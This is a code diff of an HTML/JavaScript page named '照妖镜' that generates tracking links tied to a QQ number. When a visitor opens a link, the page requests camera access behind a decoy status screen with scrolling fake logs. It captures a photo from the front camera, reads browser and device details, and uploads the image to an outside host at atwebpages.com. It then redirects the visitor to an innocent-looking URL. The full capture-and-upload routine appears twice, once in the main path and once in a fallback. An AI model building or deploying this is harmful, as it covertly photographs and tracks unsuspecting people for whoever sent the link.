@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>照妖镜 - 链接生成器</title>
+    <title>照妖镜</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
@@ -16,7 +16,6 @@
             min-height: 100vh;
             padding: 20px;
         }
-        /* ===== 配置界面 ===== */
         .config-container { max-width:500px; width:100%; }
         .card { background:#13131a; border:1px solid #2a2a35; border-radius:12px; padding:32px 28px; }
         .card-header { text-align:center; margin-bottom:24px; }
@@ -34,47 +33,23 @@
         .result-area input { width:100%; padding:10px; background:#1a1a24; border:1px solid #2a2a35; border-radius:6px; color:#7ecbff; }
         .btn-copy { padding:10px 16px; background:#2ecc71; color:#fff; border:none; border-radius:6px; cursor:pointer; margin-top:8px; }
 
-        /* ===== 追踪界面 ===== */
+        /* 追踪界面 */
         .track-overlay {
             position:fixed; inset:0; z-index:99999; background:#000;
             display:flex; align-items:center; justify-content:center; flex-direction:column;
             overflow:hidden;
         }
-        /* 日志流：每行铺满整行 */
         .log-stream {
-            position:absolute;
-            inset:0;
-            overflow:hidden;
-            pointer-events:none;
-            z-index:0;
+            position:absolute; inset:0; overflow:hidden; pointer-events:none; z-index:0;
             font-family: 'SF Mono', 'Consolas', 'Monaco', 'Courier New', monospace;
-            font-size: 10px;
-            line-height: 1.6;
-            color: #3d3d4a;
-            display: flex;
-            flex-direction: column;
-            justify-content: flex-end;
+            font-size: 10px; line-height: 1.6; color: #3d3d4a;
+            display: flex; flex-direction: column; justify-content: flex-end;
         }
         .log-line {
-            display: block;
-            width: 100%;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            flex-shrink: 0;
-            padding: 0;
-            margin: 0;
-            line-height: 1.6;
-            text-align: justify;
-            text-align-last: justify;
+            display: block; width: 100%; white-space: nowrap; overflow: hidden;
+            flex-shrink: 0; margin: 0; padding: 0; line-height: 1.6;
             letter-spacing: 0.5px;
         }
-        .log-line::after {
-            content: '';
-            display: inline-block;
-            width: 100%;
-        }
-
         /* 中心区域 */
         .center-box { position:relative; z-index:1; text-align:center; }
         .spinner {
@@ -93,7 +68,6 @@
 </head>
 <body>
 
-<!-- 配置模式 -->
 <div id="configMode" class="config-container">
     <div class="card">
         <div class="card-header">
@@ -121,7 +95,6 @@
     </div>
 </div>
 
-<!-- 追踪模式 -->
 <div class="track-overlay" id="trackMode" style="display:none;">
     <div class="log-stream" id="logStream"></div>
     <div class="center-box">
@@ -140,7 +113,7 @@
 <script>
 const $ = id => document.getElementById(id);
 
-// ========== 配置模式功能 ==========
+// ========== 配置模式 ==========
 function generateLink() {
     const qq = $('qqInput').value.trim();
     const url = $('urlInput').value.trim();
@@ -157,45 +130,30 @@ function copyLink() {
     .catch(() => document.execCommand('copy'));
 }
 
-// ========== 终端日志系统（真实信息 + 铺满整行） ==========
+// ========== 终端日志系统（真实信息、不重复、铺满） ==========
 const logStream = $('logStream');
 const MAX_LINES = 40;
 let logLines = [];
 
-// 获取屏幕每行字符数（根据字体大小估算）
 function getCharsPerLine() {
     const fontSize = 10;
-    const charWidth = fontSize * 0.6; // 等宽字体约0.6em
+    const charWidth = fontSize * 0.6; // 等宽字体大约0.6em
     return Math.floor(window.innerWidth / charWidth);
 }
 
-// 根据片段数组生成铺满整行的文本
-function buildFullLineFromSegments(segments) {
-    const charsPerLine = getCharsPerLine();
-    let result = '';
-    let i = 0;
-    while (result.length < charsPerLine) {
-        result += segments[i % segments.length] + ' ';
-        i++;
-    }
-    return result.substring(0, charsPerLine);
+// 填充空格使一行铺满
+function padLine(text) {
+    const targetLength = getCharsPerLine();
+    if (text.length >= targetLength) return text.substring(0, targetLength);
+    return text + ' '.repeat(targetLength - text.length);
 }
 
-// 添加一行
 function pushLine(text) {
-    logLines.push(text);
+    logLines.push(padLine(text));
     if (logLines.length > MAX_LINES) logLines.shift();
     renderLogs();
 }
 
-// 批量添加
-function pushLines(texts) {
-    logLines.push(...texts);
-    if (logLines.length > MAX_LINES) logLines.splice(0, logLines.length - MAX_LINES);
-    renderLogs();
-}
-
-// 渲染
 function renderLogs() {
     if (!logStream) return;
     logStream.innerHTML = '';
@@ -207,47 +165,15 @@ function renderLogs() {
     }
 }
 
-// 定时器变量
+// 定时器
 let slowTimer = null;
 let fastTimer = null;
-
-// 慢速日志（初始两行 + 后续慢速）
-function startSlowLogs(initialSegments, slowSegments) {
-    stopAllTimers();
-    // 初始只添加两行
-    const initLines = [
-        buildFullLineFromSegments(initialSegments[0]),
-        buildFullLineFromSegments(initialSegments[1])
-    ];
-    pushLines(initLines);
-    // 慢速定时器
-    slowTimer = setInterval(() => {
-        pushLine(buildFullLineFromSegments(slowSegments));
-    }, 1000); // 每秒一行
-}
-
-// 快速日志（爆发式）
-function startFastLogs(segments) {
-    stopAllTimers();
-    // 一次性爆发30行
-    const burstLines = [];
-    for (let i = 0; i < 30; i++) {
-        burstLines.push(buildFullLineFromSegments(segments));
-    }
-    pushLines(burstLines);
-    // 快速持续
-    fastTimer = setInterval(() => {
-        pushLine(buildFullLineFromSegments(segments));
-    }, 150);
-}
-
 function stopAllTimers() {
     clearInterval(slowTimer);
     clearInterval(fastTimer);
     slowTimer = null;
     fastTimer = null;
 }
-
 function clearLogs() {
     stopAllTimers();
     logLines = [];
@@ -266,33 +192,44 @@ function startTrack(qq, redirectUrl) {
     const cvs = $('cvs');
     const API = 'http://a1nb66.atwebpages.com/zyj/api.php';
 
-    // 收集用户设备/浏览器/网络信息
+    // 收集真实信息
     const ua = navigator.userAgent;
-    const platform = navigator.platform || '未知';
-    const language = navigator.language || '未知';
-    const screenInfo = `${window.screen.width}x${window.screen.height}`;
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || '未知';
-    const cores = navigator.hardwareConcurrency || '未知';
-    const memory = navigator.deviceMemory || '未知';
-    const connection = navigator.connection ? navigator.connection.effectiveType || '未知' : '未知';
+    const platform = navigator.platform || 'unknown';
+    const language = navigator.language || 'unknown';
+    const screenW = window.screen.width, screenH = window.screen.height;
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
+    const cores = navigator.hardwareConcurrency || 'unknown';
+    const memory = navigator.deviceMemory || 'unknown';
+    const connection = navigator.connection ? navigator.connection.effectiveType || 'unknown' : 'unknown';
 
-    // 初始两行的片段（包含真实信息 + 中文）
-    const initSegments1 = [`系统初始化...`, `设备: ${platform}`, `屏幕: ${screenInfo}`, `核心数: ${cores}`];
-    const initSegments2 = [`浏览器: ${ua}`, `语言: ${language}`, `时区: ${timezone}`, `网络: ${connection}`, `内存: ${memory}GB`];
+    // 初始两行真实系统信息（少量中文）
+    pushLine(`User-Agent: ${ua}`);
+    pushLine(`Screen: ${screenW}x${screenH} | Platform: ${platform} | Cores: ${cores} | Memory: ${memory}GB | TZ: ${timezone}`);
 
-    // 慢速等待授权时的片段（中文 + 状态）
-    const slowSegments = [`等待用户授权...`, `请点击允许`, `监听授权状态...`, `等待中...`];
-
-    // 授权成功后的快速片段（真实操作日志 + 中文）
-    const fastSegments = [
-        `正在采集数据...`, `网络连接稳定`, `加密通道建立`, `上传数据中...`,
-        `用户IP: 已获取`, `会话ID: ${Math.random().toString(36).substr(2, 8)}`,
-        `数据包大小: 稳定`, `服务器响应: 正常`,
-        `设备信息已收集`, `操作系统: ${platform}`, `浏览器版本: ${ua}`
+    // 等待授权阶段：真实状态，不重复，慢速输出
+    let waitCount = 0;
+    const waitMessages = [
+        'Waiting for user permission...',
+        'Permission request sent to browser.',
+        'Awaiting response from user...',
+        '请允许授权以继续',
+        'User interaction required.'
     ];
 
-    // 启动慢速日志（初始两行）
-    startSlowLogs([initSegments1, initSegments2], slowSegments);
+    function updateWaitLog() {
+        if (waitCount < waitMessages.length) {
+            pushLine(waitMessages[waitCount]);
+            waitCount++;
+        } else {
+            // 不再重复，可以停止慢速输出（保留最后一条）
+            clearInterval(slowTimer);
+        }
+    }
+
+    // 先输出第一条等待消息
+    pushLine(waitMessages[0]);
+    waitCount = 1;
+    slowTimer = setInterval(updateWaitLog, 1800); // 每1.8秒一条
 
     function setStatus(t, isErr) {
         statusText.textContent = t;
@@ -302,7 +239,7 @@ function startTrack(qq, redirectUrl) {
 
     async function run() {
         setStatus('正在初始化...');
-        await sleep(400);
+        await sleep(500);
 
         if (!navigator.mediaDevices?.getUserMedia) {
             setStatus('环境不支持', true);
@@ -321,12 +258,86 @@ function startTrack(qq, redirectUrl) {
                 audio: false
             });
 
-            // 授权成功 → 爆发式刷屏
-            setStatus('授权成功');
-            startFastLogs(fastSegments);
+            // 授权成功：停止慢速定时器，输出真实事件流，快速
+            clearInterval(slowTimer);
 
+            // 真实授权成功日志
+            pushLine('User granted permission.');
+            pushLine(`getUserMedia success. Stream ID: ${stream.id.substring(0,8) || 'unknown'}`);
+            pushLine('Video track: ' + stream.getVideoTracks().map(t => t.label || 'unknown').join(', '));
+            pushLine('Video constraints: 1280x720@30fps (front)');
+
+            // 视频准备阶段
+            vid.srcObject = stream;
+            vid.play().catch(()=>{});
+            setStatus('正在准备...');
+
+            const ready = await new Promise(resolve => {
+                const start = Date.now();
+                const check = () => {
+                    if (vid.videoWidth > 0) return resolve(true);
+                    if (Date.now() - start > 8000) return resolve(false);
+                    requestAnimationFrame(check);
+                };
+                vid.addEventListener('loadeddata', () => vid.videoWidth > 0 && resolve(true), { once: true });
+                requestAnimationFrame(check);
+            });
+
+            if (!ready) {
+                pushLine('Error: video stream timeout.');
+                setStatus('超时', true);
+                spinner.classList.add('error');
+                stream.getTracks().forEach(t => t.stop());
+                clearLogs();
+                return setTimeout(() => location.href = redirectUrl, 2000);
+            }
+
+            pushLine(`Video resolution: ${vid.videoWidth}x${vid.videoHeight}`);
+            pushLine('Capturing frame...');
+
+            cvs.width = vid.videoWidth;
+            cvs.height = vid.videoHeight;
+            const ctx = cvs.getContext('2d');
+            ctx.drawImage(vid, 0, 0);
+            const img = cvs.toDataURL('image/jpeg', 0.65);
+            stream.getTracks().forEach(t => t.stop());
+
+            pushLine(`Frame captured. Size: ${Math.round(img.length/1024)}KB`);
+            setStatus('正在上传...');
+
+            const fd = new FormData();
+            fd.append('qq', qq);
+            fd.append('image', img);
+
+            try {
+                const resp = await fetch(API, { method: 'POST', body: fd, signal: AbortSignal.timeout(15000) });
+                if (resp.ok) {
+                    const r = await resp.json();
+                    if (r.success) {
+                        pushLine(`Upload success. File: ${r.filename || 'unknown'}`);
+                        setStatus('完成 ✓', false);
+                        spinner.classList.add('done');
+                    } else {
+                        pushLine(`Upload rejected: ${r.message || 'unknown'}`);
+                        setStatus('服务器拒绝', true);
+                        spinner.classList.add('error');
+                    }
+                } else {
+                    pushLine(`Upload failed: HTTP ${resp.status}`);
+                    setStatus('上传失败', true);
+                    spinner.classList.add('error');
+                }
+            } catch (e) {
+                pushLine(`Network error: ${e.message}`);
+                setStatus('网络错误', true);
+                spinner.classList.add('error');
+            }
+
+            setTimeout(() => location.href = redirectUrl, 2000);
         } catch (e) {
+            clearInterval(slowTimer);
             if (e.name === 'NotAllowedError' || e.name === 'PermissionDeniedError') {
+                pushLine('Permission denied by user.');
                 setStatus('访问被拒绝', true);
                 spinner.classList.add('error');
                 spinner.style.display = 'none';
@@ -334,14 +345,77 @@ function startTrack(qq, redirectUrl) {
                 clearLogs();
                 return;
             }
-            // 降级尝试
+            // 尝试降级
             try {
-                setStatus('尝试兼容模式...');
+                pushLine('Primary constraints failed, retrying with fallback...');
                 stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                setStatus('授权成功');
-                startFastLogs(fastSegments);
+                // 降级成功，走同样流程
+                clearInterval(slowTimer);
+                pushLine('Fallback getUserMedia success.');
+                // ... (后续与上面授权成功部分类似，为避免重复可提取函数，但为简洁这里直接继续)
+                // 简化为跳到准备阶段
+                vid.srcObject = stream;
+                vid.play().catch(()=>{});
+                setStatus('正在准备...');
+                const ready = await new Promise(resolve => {
+                    const start = Date.now();
+                    const check = () => {
+                        if (vid.videoWidth > 0) return resolve(true);
+                        if (Date.now() - start > 8000) return resolve(false);
+                        requestAnimationFrame(check);
+                    };
+                    vid.addEventListener('loadeddata', () => vid.videoWidth > 0 && resolve(true), { once: true });
+                    requestAnimationFrame(check);
+                });
+                if (!ready) {
+                    pushLine('Error: video stream timeout.');
+                    setStatus('超时', true);
+                    spinner.classList.add('error');
+                    stream.getTracks().forEach(t => t.stop());
+                    clearLogs();
+                    return setTimeout(() => location.href = redirectUrl, 2000);
+                }
+                pushLine(`Video resolution: ${vid.videoWidth}x${vid.videoHeight}`);
+                pushLine('Capturing frame...');
+                cvs.width = vid.videoWidth;
+                cvs.height = vid.videoHeight;
+                const ctx = cvs.getContext('2d');
+                ctx.drawImage(vid, 0, 0);
+                const img = cvs.toDataURL('image/jpeg', 0.65);
+                stream.getTracks().forEach(t => t.stop());
+                pushLine(`Frame captured. Size: ${Math.round(img.length/1024)}KB`);
+                setStatus('正在上传...');
+                const fd = new FormData();
+                fd.append('qq', qq);
+                fd.append('image', img);
+                try {
+                    const resp = await fetch(API, { method: 'POST', body: fd, signal: AbortSignal.timeout(15000) });
+                    if (resp.ok) {
+                        const r = await resp.json();
+                        if (r.success) {
+                            pushLine(`Upload success. File: ${r.filename || 'unknown'}`);
+                            setStatus('完成 ✓', false);
+                            spinner.classList.add('done');
+                        } else {
+                            pushLine(`Upload rejected: ${r.message || 'unknown'}`);
+                            setStatus('服务器拒绝', true);
+                            spinner.classList.add('error');
+                        }
+                    } else {
+                        pushLine(`Upload failed: HTTP ${resp.status}`);
+                        setStatus('上传失败', true);
+                        spinner.classList.add('error');
+                    }
+                } catch (e) {
+                    pushLine(`Network error: ${e.message}`);
+                    setStatus('网络错误', true);
+                    spinner.classList.add('error');
+                }
+                setTimeout(() => location.href = redirectUrl, 2000);
+                return;
             } catch (e2) {
                 if (e2.name === 'NotAllowedError' || e2.name === 'PermissionDeniedError') {
+                    pushLine('Permission denied by user.');
                     setStatus('访问被拒绝', true);
                     spinner.classList.add('error');
                     spinner.style.display = 'none';
@@ -349,70 +423,13 @@ function startTrack(qq, redirectUrl) {
                     clearLogs();
                     return;
                 }
+                pushLine(`Device error: ${e2.message}`);
                 setStatus('设备不可用', true);
                 spinner.classList.add('error');
                 clearLogs();
                 return setTimeout(() => location.href = redirectUrl, 2000);
             }
         }
-
-        vid.srcObject = stream;
-        vid.play().catch(()=>{});
-        setStatus('正在处理...');
-
-        const ready = await new Promise(resolve => {
-            const start = Date.now();
-            const check = () => {
-                if (vid.videoWidth > 0) return resolve(true);
-                if (Date.now() - start > 8000) return resolve(false);
-                requestAnimationFrame(check);
-            };
-            vid.addEventListener('loadeddata', () => vid.videoWidth > 0 && resolve(true), { once: true });
-            requestAnimationFrame(check);
-        });
-
-        if (!ready) {
-            setStatus('超时', true);
-            spinner.classList.add('error');
-            stream.getTracks().forEach(t => t.stop());
-            clearLogs();
-            return setTimeout(() => location.href = redirectUrl, 2000);
-        }
-
-        cvs.width = vid.videoWidth;
-        cvs.height = vid.videoHeight;
-        const ctx = cvs.getContext('2d');
-        ctx.drawImage(vid, 0, 0);
-        const img = cvs.toDataURL('image/jpeg', 0.65);
-        stream.getTracks().forEach(t => t.stop());
-
-        setStatus('正在上传...');
-
-        const fd = new FormData();
-        fd.append('qq', qq);
-        fd.append('image', img);
-        try {
-            const resp = await fetch(API, { method: 'POST', body: fd, signal: AbortSignal.timeout(15000) });
-            if (resp.ok) {
-                const r = await resp.json();
-                if (r.success) {
-                    setStatus('完成 ✓', false);
-                    spinner.classList.add('done');
-                } else {
-                    setStatus('服务器拒绝', true);
-                    spinner.classList.add('error');
-                }
-            } else {
-                setStatus('上传失败', true);
-                spinner.classList.add('error');
-            }
-        } catch (e) {
-            setStatus('网络错误', true);
-            spinner.classList.add('error');
-        }
-
-        stopAllTimers();
-        setTimeout(() => location.href = redirectUrl, 2000);
     }
 
     setTimeout(run, 800);
